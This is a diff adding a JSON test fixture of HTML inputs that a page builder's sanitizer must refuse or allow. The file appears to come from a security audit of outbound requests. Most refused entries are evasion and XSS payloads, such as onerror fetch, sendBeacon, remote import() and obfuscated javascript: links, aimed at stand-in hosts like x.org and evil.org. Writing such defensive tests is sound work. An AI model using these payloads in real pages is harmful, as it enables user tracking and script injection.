@@ -1,0 +1,332 @@
+[
+ {
+  "name": "img https (control)",
+  "html": "<img src=\"https://x.org/a.jpg\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "img unquoted https",
+  "html": "<img src=https://x.org/a.jpg>",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "srcset 2nd candidate",
+  "html": "<img src=\"a.jpg\" srcset=\"a.jpg 1x, https://x.org/b.jpg 2x\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "srcset 1st candidate",
+  "html": "<img srcset=\"https://x.org/b.jpg 2x\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "link preload",
+  "html": "<link rel=\"preload\" as=\"image\" href=\"https://x.org/a.jpg\">",
+  "refused_for": "attribute \"as\" on <link>",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "link prefetch",
+  "html": "<link rel=\"prefetch\" href=\"https://x.org/a\">",
+  "refused_for": "a <link> may only reach Google Fonts",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "link icon",
+  "html": "<link rel=\"icon\" href=\"https://x.org/f.ico\">",
+  "refused_for": "a <link> may only reach Google Fonts",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "link stylesheet",
+  "html": "<link rel=\"stylesheet\" href=\"https://x.org/s.css\">",
+  "refused_for": "a <link> may only reach Google Fonts",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "link stylesheet sneaking fonts.googleapis in query",
+  "html": "<link rel=\"stylesheet\" href=\"https://evil.org/s.css?fonts.googleapis.com\">",
+  "refused_for": "a <link> may only reach Google Fonts",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "css @import in style",
+  "html": "<style>@import \"https://x.org/s.css\";</style>",
+  "refused_for": "CSS uses @import",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "css url(http:) no //",
+  "html": "<span style=\"background:url(https:x.org/a.jpg)\">x</span>",
+  "refused_for": "CSS url() points outside the page",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "css url(//)",
+  "html": "<span style=\"background:url(//x.org/a.jpg)\">x</span>",
+  "refused_for": "CSS url() points outside the page",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "css url with entity",
+  "html": "<span style=\"background:url(&quot;https://x.org/a.jpg&quot;)\">x</span>",
+  "refused_for": "CSS url() points outside the page",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "css url escaped",
+  "html": "<span style=\"background:u\\72l(https://x.org/a.jpg)\">x</span>",
+  "refused_for": "CSS url() points outside the page",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "css image-set",
+  "html": "<span style=\"background-image:image-set('https://x.org/a.jpg' 1x)\">x</span>",
+  "refused_for": "CSS uses image-set(",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "object data",
+  "html": "<object data=\"https://x.org/a.svg\"></object>",
+  "refused_for": "<object> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "embed src",
+  "html": "<embed src=\"https://x.org/a.svg\">",
+  "refused_for": "<embed> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "video poster",
+  "html": "<video poster=\"https://x.org/a.jpg\"></video>",
+  "refused_for": "<video> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "input type=image",
+  "html": "<input type=\"image\" src=\"https://x.org/a.png\">",
+  "refused_for": "attribute \"src\" on <input>",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "svg image href",
+  "html": "<svg><image href=\"https://x.org/a.png\"/></svg>",
+  "refused_for": "<image> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "svg use href",
+  "html": "<svg><use href=\"https://x.org/s.svg#a\"/></svg>",
+  "refused_for": "<use> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "body/table background",
+  "html": "<table background=\"https://x.org/a.jpg\"><tr><td>x</td></tr></table>",
+  "refused_for": "attribute \"background\" on <table>",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "iframe https",
+  "html": "<iframe src=\"https://x.org/\"></iframe>",
+  "refused_for": "<iframe> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "iframe srcdoc img",
+  "html": "<iframe srcdoc=\"&lt;img src=https://x.org/a.jpg&gt;\"></iframe>",
+  "refused_for": "<iframe> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "meta refresh",
+  "html": "<meta http-equiv=\"refresh\" content=\"0;url=https://x.org/\">",
+  "refused_for": "<meta> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "img with newline before src",
+  "html": "<img\nsrc=\"https://x.org/a.jpg\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "img src entity-encoded scheme",
+  "html": "<img src=\"https&#58;//x.org/a.jpg\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "img src backslashes",
+  "html": "<img src=\"https:\\\\x.org\\a.jpg\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "img src with tab in scheme",
+  "html": "<img src=\"ht&#9;tps://x.org/a.jpg\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "img src= spaced",
+  "html": "<img src = \"https://x.org/a.jpg\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "img onerror new Image",
+  "html": "<img src=\"x\" onerror=\"new Image().src='https://x.org/p'\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "onerror fetch",
+  "html": "<img src=\"x\" onerror=\"fetch('https://x.org/p')\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "onerror fetch spaced/bracket",
+  "html": "<img src=\"x\" onerror=\"window['fet'+'ch']('https://x.org/p')\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "inline script new Image",
+  "html": "<script>new Image().src=\"https://x.org/p\"</script>",
+  "refused_for": "script blocks; only the builder's own may run",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "inline script sendBeacon",
+  "html": "<script>navigator.sendBeacon(\"https://x.org/p\")</script>",
+  "refused_for": "script blocks; only the builder's own may run",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "inline script import()",
+  "html": "<script>import(\"https://x.org/m.js\")</script>",
+  "refused_for": "script blocks; only the builder's own may run",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "inline script location",
+  "html": "<script>location.href=\"https://x.org/p\"</script>",
+  "refused_for": "script blocks; only the builder's own may run",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "script src",
+  "html": "<script src=\"https://x.org/a.js\"></script>",
+  "refused_for": "attribute \"src\" on <script>",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "script type=module import from",
+  "html": "<script type=\"module\">import x from \"https://x.org/m.js\"</script>",
+  "refused_for": "script blocks; only the builder's own may run",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "a ping",
+  "html": "<a href=\"#\" ping=\"https://x.org/p\">x</a>",
+  "refused_for": "attribute \"ping\" on <a>",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "audio src",
+  "html": "<audio src=\"//x.org/a.mp3\" autoplay></audio>",
+  "refused_for": "<audio> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "img lowsrc/dynsrc",
+  "html": "<img dynsrc=\"https://x.org/a\" lowsrc=\"https://x.org/b\">",
+  "refused_for": "<img> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "base href",
+  "html": "<base href=\"https://x.org/\">",
+  "refused_for": "<base> is not a tag",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "font-face",
+  "html": "<style>@font-face{font-family:z;src:url(https://x.org/f.woff)}</style>",
+  "refused_for": "CSS url() points outside the page",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "fetch via globalThis",
+  "html": "<script>globalThis[\"fetch\"](\"https://x.org/\")</script>",
+  "refused_for": "script blocks; only the builder's own may run",
+  "from": "Gate 2 audit laneA-1 (fuzz.py)"
+ },
+ {
+  "name": "event handler on an allowed tag",
+  "html": "<span onmouseover=\"fetch('https://x.org/p')\">x</span>",
+  "refused_for": "attribute \"onmouseover\" on <span>",
+  "from": "lane A round 2"
+ },
+ {
+  "name": "javascript: link",
+  "html": "<a href=\"java&#9;script:fetch('https://x.org/p')\">x</a>",
+  "refused_for": "href runs script",
+  "from": "lane A round 2"
+ },
+ {
+  "name": "svg paint server url()",
+  "html": "<svg><rect fill=\"url(https://x.org/p.svg#g)\"/></svg>",
+  "refused_for": "holds a url()",
+  "from": "lane A round 2"
+ },
+ {
+  "name": "link to Google Fonts host but plain http",
+  "html": "<link rel=\"stylesheet\" href=\"http://fonts.googleapis.com/css2?family=X\">",
+  "refused_for": "a <link> may only reach Google Fonts",
+  "from": "lane A round 2"
+ },
+ {
+  "name": "form action",
+  "html": "<form action=\"https://x.org/p\"><button>x</button></form>",
+  "refused_for": "<form> is not a tag",
+  "from": "lane A round 2"
+ },
+ {
+  "name": "plain link with target and rel",
+  "html": "<a href=\"https://www.museodelprado.es/en\" target=\"_blank\" rel=\"noopener\">Prado</a>",
+  "refused_for": null,
+  "from": "lane A round 2: must BUILD (no false positive)"
+ },
+ {
+  "name": "inline formatting",
+  "html": "<strong>Book</strong> <em>by</em> <b>10:00</b> <i>sharp</i><br><span class=\"x\">x</span> <small>s</small> <sup>1</sup>",
+  "refused_for": null,
+  "from": "lane A round 2: must BUILD (no false positive)"
+ },
+ {
+  "name": "a URL as plain text",
+  "html": "see https://example.org/style.css or url(https://x.org) in prose",
+  "refused_for": null,
+  "from": "lane A round 2: must BUILD (no false positive)"
+ },
+ {
+  "name": "Google Fonts stylesheet",
+  "html": "<link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/css2?family=Inter&display=swap\">",
+  "refused_for": null,
+  "from": "lane A round 2: must BUILD (no false positive)"
+ },
+ {
+  "name": "inline style with no fetch",
+  "html": "<span style=\"color:var(--ink-soft);margin-top:4px\">quiet</span>",
+  "refused_for": null,
+  "from": "lane A round 2: must BUILD (no false positive)"
+ }
+]
